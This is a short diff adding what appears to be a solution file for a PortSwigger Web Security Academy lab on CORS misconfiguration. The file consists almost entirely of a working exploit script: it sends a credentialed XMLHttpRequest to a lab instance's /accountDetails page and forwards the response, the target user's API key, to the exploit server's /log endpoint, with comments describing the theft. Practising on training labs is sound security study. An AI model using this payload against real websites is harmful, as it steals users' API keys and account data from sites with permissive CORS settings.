@@ -1,0 +1,15 @@
+# Reveal the target user's API KEY via CORS misconfiguration in Access-Control-Allow-Origin Header
+# Once target user navigates to exploit server they are redirected to their /accountDetails page which then reflects target's api Key in the URL
+# This information can be logged in the reqListener function
+
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://ac021fc31e49690ac0ee5edb000a0074.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+    
+    function reqListener() {
+ location='/log?key='+this.responseText;
+    }; 
+</script>
